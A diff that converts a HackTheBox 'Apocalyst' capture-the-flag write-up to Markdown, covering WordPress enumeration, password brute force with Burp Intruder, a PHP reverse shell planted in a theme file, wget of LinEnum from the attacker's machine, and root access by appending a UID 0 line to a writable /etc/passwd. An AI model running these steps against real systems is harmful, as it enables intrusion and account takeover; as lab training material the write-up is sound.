@@ -1,10 +1,10 @@
 
-Apocalyst CTF Writeup
+# Apocalyst CTF Writeup
 
-This is a write up for the retired box Apocalyst from HackTheBox.eu
+##### This is a write up for the retired box Apocalyst from HackTheBox.eu
 
-Host: 10.10.10.46
-
+`Host: 10.10.10.46`
+```
 root@kali:~# nmap -T4 -A -v 10.10.10.46
 
 Starting Nmap 7.40 ( https://nmap.org ) at 2017–11–23 17:01 EST
@@ -54,23 +54,27 @@ PORT STATE SERVICE VERSION
 |_http-server-header: Apache/2.4.18 (Ubuntu)
 |_http-title: Apocalypse Preparation Blog
 No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
-
+```
 When we access the web-server this is what we see
+![Medium](https://cdn-images-1.medium.com/max/1000/1*p9zY0nkL0z_QHtUd9IyPYA.png)
 
 For some reason the formatting of the Wordpress website is screwed up, so I added the default domain name of the box apocalyst.htb to the /etc/hosts and that fixed the formatting issue.
+![Medium](https://cdn-images-1.medium.com/max/1000/1*Nz_Wwy-eMwnHfmp5o3GviA.png)
 
 The next step in my reconnaissance phase would be to scan for known directories names and files using Dirbuster with the Dirbuster medium dictionary. I didn’t let Dirbuster to fully run because it found 100 folders and 80 files very quickly and…
+<a href="https://imgflip.com/gif/203cc6"><img src="https://i.imgflip.com/203cc6.gif" title="made at imgflip.com"/></a>
 
 that’s way too many folders and files to go over in a CTF, so I just scanned only for folders instead but still couldn’t find anything interesting…
 
 I created my own custom wordlist with Cewl.
-
+```
 cewl 10.10.10.46 > Desktop/custom_dict.txt
-
+```
 When we run our custom wordlist with dirbuster again we can see that all requests have a response size of 421 except one that has a size 440.
 
+![Medium](https://cdn-images-1.medium.com/max/800/1*EbWshqN1hW_7dfsHKGKvnw.png)
 which means it has different content than all of the other requests or there’s an abnormal error. When look at the source code of the folder with the 440 response size, we can see an interesting comment.
-
+```
 <!doctype html>
 
 <html lang=”en”>
@@ -85,11 +89,13 @@ which means it has different content than all of the other requests or there’s
  <! — needle →
 </body>
 </html>
+```
+`<! — needle — >` maybe it’s a metaphor for a needle in a hay stack? So stenography maybe? When we go to the folder were brought to an apocalyptic image.
 
-<! — needle — > maybe it’s a metaphor for a needle in a hay stack? So stenography maybe? When we go to the folder were brought to an apocalyptic image.
 
 I saved it and checked for strings but there was no interesting strings in the metadata of the image. I used steghide to check for embedded data.
-
+![Medium](https://cdn-images-1.medium.com/max/800/1*CDFI9aoNEs-RLSnsVhnc5Q.png)
+```
 root@kali:~/Downloads# steghide info image.jpg 
 “image.jpg”:
  format: jpeg
@@ -100,16 +106,15 @@ Enter passphrase:
  size: 3.6 KB
  encrypted: rijndael-128, cbc
  compressed: yes
-
-as you can see it does in fact have an embedded file named list.txt encrypted in rijndael-1128 Let’s extract the file
-
-
+```
+as you can see it does in fact have an embedded file named `list.txt` encrypted in `rijndael-1128` Let’s extract the file
+```
 root@kali:~/Downloads# steghide extract -sf image.jpg 
 Enter passphrase: 
 wrote extracted data to “list.txt”.
-
+```
 The file had no pass-phrase I just hit enter and it worked. Now we get another words-list… I didn’t know what to do with this list at the moment so I moved on to enumerating Wordpress with wpscan
-
+```
 root@kali:~/Downloads# wpscan — url http://10.10.10.46 --enumerate u 
 _______________________________________________________________
  __ _______ _____ 
@@ -226,36 +231,51 @@ _______________________________________________________________
  + — — + — — — — — + — — — — — — — — — — — — — — — — — -+
  | 1 | falaraki | falaraki — Apocalypse Preparation |
  + — — + — — — — — + — — — — — — — — — — — — — — — — — -+
-
-We can see that wpscan found a bunch of possible vulnerabilities and a user named falaraki. Maybe let’s brute force wordpress with the word-list we got from the image on http://10.10.10.46/wp-login.php
+```
+We can see that wpscan found a bunch of possible vulnerabilities and a user named falaraki. Maybe let’s brute force wordpress with the word-list we got from the image on `http://10.10.10.46/wp-login.php`
 
 I captured a test request in Burp Suite at the login page and sent it over to the intruder option.
 
-Were going to select the password pwd parameter only and the Attack type will be Sniper. We move onto to the payloads section and add the list we got from the image. Then start the attack - all requests sent back a 200 status code and most of them had a 3101 in length except this one request that had 3764 in length meaning it either worked as the correct password, timed out, or it gave us a unique error that only that password can give.
+![Medium](https://cdn-images-1.medium.com/max/1000/1*p0dXvfwtCk_kh8uqzCDqiw.png)
+
+Were going to select the password `pwd` parameter only and the Attack type will be Sniper. We move onto to the payloads section and add the list we got from the image. Then start the attack - all requests sent back a 200 status code and most of them had a 3101 in length except this one request that had 3764 in length meaning it either worked as the correct password, timed out, or it gave us a unique error that only that password can give.
+![Medium](https://cdn-images-1.medium.com/max/800/1*Tiqvzm1l1lT7UN9AcbU84g.png)
 
 Let’s try to login with that password Transclisiation
 
 username: falaraki 
 password: Transclisiation
-…and were in!
+
+## …and were in!
+
+<p align="center">
+<img align="center" src="giphy-downsized-large.gif" width="100%" alt=" Gif"/>
+</p>
 
 Now we can upload our php reverse shell in the Appearance Editor. I got my php shell from PenTestMonkey I’m not going to paste the entire code here because it’s a lot of code, so all you have to do is change your ip and port number. Where it says //CHANGE THIS to your ip and desired port number.
-
+```
 $ip = ‘127.0.0.1’; // CHANGE THIS
 $port = 1234; // CHANGE THIS
+```
+
+![Medium](https://cdn-images-1.medium.com/max/1000/1*pPSCaR3SLq6bJp03dl7BnA.png)
 
 Save the changes made to the file once your reverse shell is in and setup your netcat or metasploit listener. Then execute the php reverse shell.
 
 http://apocalyst.htb/wp-content/themes/twentyseventeen/404.php
 
+![Medium](https://cdn-images-1.medium.com/max/1000/1*0rBzf6vwduDRypZDPNF4UA.png)
+
 Now we can get the user flag!
 
-“One of my go-to commands after catching a dumb shell is to use Python to spawn a pty. The pty module let’s you spawn a psuedo-terminal that can fool commands like su into thinking they are being executed in a proper terminal. To upgrade a dumb shell, simply run the following command”
+![Medium](https://cdn-images-1.medium.com/max/1000/1*HKEG1VmC4zUukGrXrwrgFg.png)
 
-python3 -c 'import pty; pty.spawn("/bin/bash")'
+“One of my go-to commands after catching a dumb shell is to use Python to spawn a pty. The pty module let’s you spawn a psuedo-terminal that can fool commands like `su` into thinking they are being executed in a proper terminal. To upgrade a dumb shell, simply run the following command”
+
+`python3 -c 'import pty; pty.spawn("/bin/bash")'`
 
 I uploaded linux-exploit-suggester to the system to check for possible privilege escalation exploits.
-
+```
 www-data@apocalyst:/tmp$ ./linux-exploit-suggester.sh
 ./linux-exploit-suggester.sh
 
@@ -357,16 +377,16 @@ Comments: Needs to be sudoer. Works only on SELinux enabled systems
 Details: https://www.sudo.ws/alerts/linux_tty.html
 Download URL: https://raw.githubusercontent.com/c0d3z3r0/sudo-CVE-2017-1000367/master/sudopwn.c
 Comments: Needs to be sudoer. Works only on SELinux enabled systems
-
+```
 Again we have a bunch of possible exploits but I’m not done enumerating, I’m going to upload LinEnum.sh to enumerate the entire system. I started a python HTTP server listening on port 8080 on my local machine
-
+```
 root@kali:~/Downloads/LinEnum# ls
 CHANGELOG.md CONTRIBUTORS.md LinEnum.sh README.md
 root@kali:~/Downloads/LinEnum# python -m SimpleHTTPServer 8080
 Serving HTTP on 0.0.0.0 port 8080 …
-
+```
 and downloaded the LinEnum.sh file into the temp folder of the victim.
-
+```
 www-data@apocalyst:/tmp$ wget http://10.10.14.122:8080/LinEnum.sh
 wget http://10.10.14.122:8080/LinEnum.sh
  — 2017–11–23 23:53:22 —  http://10.10.14.122:8080/LinEnum.sh
@@ -400,88 +420,80 @@ drwx — — — 3 root root 4096 Nov 23 16:26 systemd-private-545318da7c6e44889
 drwxrwxr-x 2 falaraki falaraki 4096 Nov 23 23:52 tmp
 drwx — — — 2 root root 4096 Nov 23 16:26 vmware-root
 -rwxr-xr-x 1 www-data www-data 207 Nov 23 19:48 wsbBhpkLkI
+```
 
 I gave it execute permissions and I ran the script. We get a bunch of output that I’m not going to paste here because it will make my writeup extremely long, but I found something interesting we can write to /etc/passwd
-
+```
 Can we read/write sensitive files:
 -rw-rw-r — 1 root root 1637 Nov 23 23:46 /etc/passwd
 -rw-r — r — 1 root root 830 Jul 27 12:06 /etc/group
 -rw-r — r — 1 root root 575 Oct 22 2015 /etc/profile
 -rw-r — — — 1 root shadow 1070 Jul 26 13:41 /etc/shadow
-
-    -rw- is the permission of the owner of the file which is root
-    -rw- is the permission that the group has over the file
-    -r — is the permissions that all the other users have over the file
+``` 
+-rw- is the permission of the owner of the file which is root
+-rw- is the permission that the group has over the file
+-r — is the permissions that all the other users have over the file
 
 I used openssl to generate a password the password was HackedByKatz
 
+![Medium](https://cdn-images-1.medium.com/max/800/1*9M0TuGjR49BkXKg6CxIJjQ.png)
+
 The purpose of the openssl passwd command is to feed your password through a one-way hashing algorithm (-1 outputs MD5). What that gets you is a string that's derived from your password cryptographically, but cannot be used to find your password on its own if an attacker gets their hands on the hashed version.
 
-    The /etc/passwd contains one entry per line for each user (or user account) of the system. All fields are separated by a colon (:) symbol. Total seven fields as follows. Generally, passwd file entry looks as follows…
+> The /etc/passwd contains one entry per line for each user (or user account) of the system. All fields are separated by a colon > (:) symbol. Total seven fields as follows. Generally, passwd file entry looks as follows…
+> Source: https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/
 
-    Source: https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/
+![Medium](https://cdn-images-1.medium.com/max/800/1*QSskQekmHqsNIMKs3GObmA.png)
 
-    Username: It is used when user logs in. It should be between 1 and 32 characters in length.
-    Password: An x character indicates that encrypted password is stored in /etc/shadow file. Please note that you need to use the passwd command to computes the hash of a password typed at the CLI or to store/update the hash of the password in /etc/shadow file.
-    User ID (UID): Each user must be assigned a user ID (UID). UID 0 (zero) is reserved for root and UIDs 1–99 are reserved for other predefined accounts. Further UID 100–999 are reserved by system for administrative and system accounts/groups.
-    Group ID (GID): The primary group ID (stored in /etc/group file)
-    User ID Info: The comment field. It allow you to add extra information about the users such as user’s full name, phone number etc. This field use by finger command.
-    Home directory: The absolute path to the directory the user will be in when they log in. If this directory does not exists then users directory becomes /
-    Command/shell: The absolute path of a command or shell (/bin/bash). Typically, this is a shell. Please note that it does not have to be a shell.
+1.  Username: It is used when user logs in. It should be between 1 and 32 characters in length.
+2.  Password: An x character indicates that encrypted password is stored in /etc/shadow file. Please note that you need to use the passwd command to computes the hash of a password typed at the CLI or to store/update the hash of the password in /etc/shadow file.
+3.  User ID (UID): Each user must be assigned a user ID (UID). UID 0 (zero) is reserved for root and UIDs 1–99 are reserved for other predefined accounts. Further UID 100–999 are reserved by system for administrative and system accounts/groups.
+4.  Group ID (GID): The primary group ID (stored in /etc/group file)
+5.  User ID Info: The comment field. It allow you to add extra information about the users such as user’s full name, phone number etc. This field use by finger command.
+6.  Home directory: The absolute path to the directory the user will be in when they log in. If this directory does not exists then users directory becomes /
+7.  Command/shell: The absolute path of a command or shell (/bin/bash). Typically, this is a shell. Please note that it does not have to be a shell.
 
 Now let’s construct a user line based on what we just learned about /etc/passwd
 
-Katz:$1$pm/vHfDN$Oa.8XX4nKsoqpU2oeT3P6/:0:0:Katz:/root:/bin/bash
+`Katz:$1$pm/vHfDN$Oa.8XX4nKsoqpU2oeT3P6/:0:0:Katz:/root:/bin/bash`
 
 All we need to do now is add it to the /etc/passwd file but we have a problem; we can’t write to /etc/password with nano or vi…. So we need to figure out another way to write to the file.
 
-Perhaps echo should work, we know that we can use >> to redirect to a file, we know that if for example we write echo “Hello World” >> file1.txt we would be creating a file with the content inside the double quotes and if we add another word with the same redirection it would append to the end of the file. We can see this action below
+![Medium](https://cdn-images-1.medium.com/max/800/1*PJ7EYetLQiSlYA9Yx2IBag.png)
+
+Perhaps `echo` should work, we know that we can use >> to redirect to a file, we know that if for example we write echo “Hello World” >> file1.txt we would be creating a file with the content inside the double quotes and if we add another word with the same redirection it would append to the end of the file. We can see this action below
+
+![Medium](https://cdn-images-1.medium.com/max/800/1*JvAfRGe6TbJ13__Km-6eQQ.png)
 
 Now if we do > that would erase all of the content and it would only have what’s inside the double quotes.
 
+![Medium](https://cdn-images-1.medium.com/max/800/1*qE4Hg-eWUfFJWffYWxSoNw.png)
+
 So we don’t want to be using > when redirecting output to /etc/passwd But we’re going to face another problem, take a look at the following screen shot
 
-I have created a variable which contains the string TEST all good right? Now if I want to display the string I assigned to the variable I have to use the $ sign. That’s how you call variables in bash. So there’s going to be conflict when if we echo passwd >> /etc/passwd there won’t be errors but bash will think that $1 and $ pm/vHfDN$Oa.8XX4nKsoqpU2oeT3P6/ are variables and your /etc/passwd file will look something like this…
+![Medium](https://cdn-images-1.medium.com/max/800/1*08R-2tNfIMC9-BSuTmbSYg.png)
 
-Katz::0:0:Katz:/root:/bin/bash
+I have created a variable which contains the string TEST all good right? Now if I want to display the string I assigned to the variable I have to use the $ sign. That’s how you call variables in bash. So there’s going to be conflict when if we `echo passwd >> /etc/passwd` there won’t be errors but bash will think that `$1` and `$pm/vHfDN$Oa.8XX4nKsoqpU2oeT3P6/` are variables and your `/etc/passwd` file will look something like this…
+
+`Katz::0:0:Katz:/root:/bin/bash`
 
 That will not allow you to login as the user Katz properly. Something that we could do to bypass this issue is to encode it in base64
 
-Copy the base64 string to decode it but on it’s way to being decoded also redirect it to the /etc/passwd file like so
+![Medium](https://cdn-images-1.medium.com/max/800/1*er-smqj8lMgKzO0ez52p7Q.png)
 
-That’s it! our user should now be in the /etc/passwd and we should be able to login with su Katz
+Copy the base64 string to decode it but on it’s way to being decoded also redirect it to the `/etc/passwd` file like so
+
+That’s it! our user should now be in the `/etc/passwd` and we should be able to login with `su Katz`
+
+![Medium](https://cdn-images-1.medium.com/max/800/1*wua1Rn8-Yie2XCuYFM8zQA.png)
 
 Got Root Flag!
 
+![Medium](https://cdn-images-1.medium.com/max/800/1*yG7Y_vl6GQvRuG0CVdbd6g.png)
+
 Overall this was a very fun box I really enjoyed it and learned a lot. I recommend you all to try this box.
 
-You can contact me on Twitter 0Katz
+You can contact me on Twitter [0Katz](https://www.twitter.com/0katz)
 
-Follow my team on Twitter @TogetherWeHack
-
-    HackingCtfWriteupHacktheboxInfosec
-
-One clap, two clap, three clap, forty?
-
-By clapping more or less, you can signal to us which stories really stand out.
-Go to the profile of 0Katz
-0Katz
-More from 0Katz
-Bastard CTF Writeup
-Go to the profile of 0Katz
-0Katz
-Also tagged Ctf
-Writeup two-Hitcon2017 & Find A function instead of rop-gadget
-Go to the profile of Ta Sung
-Ta Sung
-Also tagged Writeup
-Pwnable.kr: fd (1)
-This is my first writeup. The problem reads:
-Go to the profile of Michael Zhang
-Michael Zhang
-Responses
-0Katz
-Be the first to write a response…
-0Katz
-
+Follow my team on Twitter [TogetherWeHack](https://www.twitter.com/TogetherWeHack)
 
